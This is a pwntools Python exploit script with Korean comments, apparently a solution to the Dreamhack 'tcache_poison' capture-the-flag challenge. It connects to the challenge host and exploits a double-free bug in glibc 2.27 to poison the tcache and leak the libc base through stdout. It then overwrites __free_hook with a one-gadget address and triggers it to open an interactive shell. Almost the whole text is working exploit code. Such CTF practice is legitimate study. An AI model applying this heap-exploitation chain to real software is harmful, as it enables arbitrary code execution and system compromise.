from pwn import *

PROGRAM = 'tcache_poison'
PAYLOAD = 'A'
GADGET = 0x4f432

p = process(PROGRAM)
p = remote("host3.dreamhack.games","18323")
e = ELF(PROGRAM)
lib = ELF('libc-2.27.so')

###############
# 1. Doubly free memory
###############
# alloc chunk1
p.sendlineafter(b'Edit\n', b'1')
p.sendlineafter(b'Size:', b'50')
p.sendafter(b'Content:', PAYLOAD.encode())

# tcache: (*) -> NULL
# --------------------------

# free chunk1
p.sendlineafter(b'Edit\n', b'2')

# tcache: (*) -> chunk1
# --------------------------

# edit chunk1 (already freed)
p.sendlineafter(b'Edit\n', b'4')
p.sendafter(b'Edit chunk:', b'A' * 8 + b'\x00')  # corrupt tcache_entry to free again

# free chunk1 again <- Doubly Free Bug
p.sendlineafter(b'Edit\n', b'2')
# 이제 tcache 에는 동일한 메모리 주소를 가리키는 두 개의 chunk 가 생겼다.
# tcache: (*) -> chunk1 -> chunk1
# --------------------------

###############
# 2. Poison tcache 
###############
offset_stdout = e.symbols['stdout']
print('offset_stdout:', hex(offset_stdout))

p.sendlineafter(b'Edit\n', b'1')
p.sendlineafter(b'Size:', b'50')
p.sendafter(b'Content:', p64(offset_stdout))


# tcache: (*) -> chunk1 -> stdout -> _IO_2_1_stdout_ -> ... 
# --------------------------

# pop chunk1 from  tcache
p.sendlineafter(b'Edit\n', b'1')
p.sendlineafter(b'Size:', b'50')
p.sendafter(b'Content:', PAYLOAD.encode())

# tcache: (*) -> stdout -> _IO_2_1_stdout_ -> ... 
# --------------------------

# pop stdout
# stdout 의 실제 값에 영향을 주지 않고 프로그램 로직을 통해 tcache 에서 stdout 를 pop 하려면
# _IO_2_1_stdout_ 값을 그대로 write 해주면서 alloc 을 해야한다. 
# 전체를 write 하는 대신 마지막 byte 하나만 덮어써도 문제 없다.
lsb_of__IO_2_1_stdout_ = p64(lib.symbols['_IO_2_1_stdout_'])[0:1] # least significant byte of _IO_2_1_stdout_
p.sendlineafter(b'Edit\n', b'1')
p.sendlineafter(b'Size:', b'50')
p.sendafter(b'Content:', lsb_of__IO_2_1_stdout_)
print('lsb_of__IO_2_1_stdout_:', lsb_of__IO_2_1_stdout_)

# tcache: (*) -> _IO_2_1_stdout_ -> ... 
# --------------------------

###############
# 3. leak address into stdout
###############
p.sendlineafter(b'Edit\n', b'3')
p.recvuntil(b'Content: ')
addr_stdout = u64(p.recv(6).ljust(8, b'\x00'))

print('addr_stdout:', hex(addr_stdout))
libc_base = addr_stdout - lib.symbols['_IO_2_1_stdout_']
print('libc_base:', hex(libc_base))

###############
# 4. overwrite __free_hook
###############
offset_free_hook = lib.symbols['__free_hook']
print('offset_free_hook:', hex(offset_free_hook))
addr_free_hook = libc_base + offset_free_hook
print('addr_free_hook:', hex(addr_free_hook))

# 앞서 수행한 것 처럼, doubly free memory 를 한번 더 발생시킨다.
# chunk1 과 다른 크기의 메모리를 할당해야 함에 주의한다
# Doubly free memory
# alloc chunk2
p.sendlineafter(b'Edit\n', b'1')
p.sendlineafter(b'Size:', b'80')
p.sendafter(b'Content:', PAYLOAD.encode())

# tcache: (*) -> NULL
# --------------------------

# free chunk2
p.sendlineafter(b'Edit\n', b'2')

# tcache: (*) -> chunk2
# --------------------------

# edit chunk2 (already freed)
p.sendlineafter(b'Edit\n', b'4')
p.sendafter(b'Edit chunk:', b'A' * 8 + b'\x00')  # corrupt tcache_entry to free again

# free chunk2 again <- Doubly Free Bug
p.sendlineafter(b'Edit\n', b'2')
# 이제 tcache 에는 동일한 메모리 주소를 가리키는 두 개의 chunk 가 생겼다.
# tcache: (*) -> chunk2 -> chunk2
# --------------------------

# Poison tcache 
p.sendlineafter(b'Edit\n', b'1')
p.sendlineafter(b'Size:', b'80')
p.sendafter(b'Content:', p64(addr_free_hook))

# tcache: (*) -> chunk2 -> __free_hook -> ...
# --------------------------

# pop chunk1 from  tcache
p.sendlineafter(b'Edit\n', b'1')
p.sendlineafter(b'Size:', b'80')
p.sendafter(b'Content:', PAYLOAD.encode())

# tcache: (*) -> __free_hook -> ... 
# --------------------------

# pop __free_hook & overwrite __free_hook with gadget
p.sendlineafter(b'Edit\n', b'1')
p.sendlineafter(b'Size:', b'80')
p.sendafter(b'Content:', p64(libc_base + GADGET))
print('gadget:', hex(libc_base + GADGET))
# tcache: (*) -> ... 
# --------------------------

# call free (contaminated)
p.sendlineafter(b'Edit\n', b'2')

p.interactive()
